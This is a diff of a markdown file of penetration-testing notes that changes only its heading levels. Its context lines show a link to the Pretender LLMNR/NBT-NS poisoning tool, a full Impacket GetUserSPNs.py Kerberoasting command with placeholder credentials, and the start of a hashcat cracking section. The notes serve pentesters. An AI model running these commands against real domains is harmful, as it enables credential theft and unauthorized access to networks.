@@ -1,6 +1,6 @@
 # **ITSEC Notes**
 
-## Poisoning and Spoofing (LLMNR NBT-NS)
+# Poisoning and Spoofing 
 
 Pretender
 https://github.com/RedTeamPentesting/pretender
@@ -48,7 +48,7 @@ https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py
 python GetUserSPNs.py -debug -request -outputfile kerberoasting.txt -dc-ip 1.1.1.1 -target-domain domain.local domain/user:password
 ```
 
-## Cracking
+# Cracking
 From Kerberoast output, remove * and be replace / with :
 
 Example Kerberoast hashcat syntax:
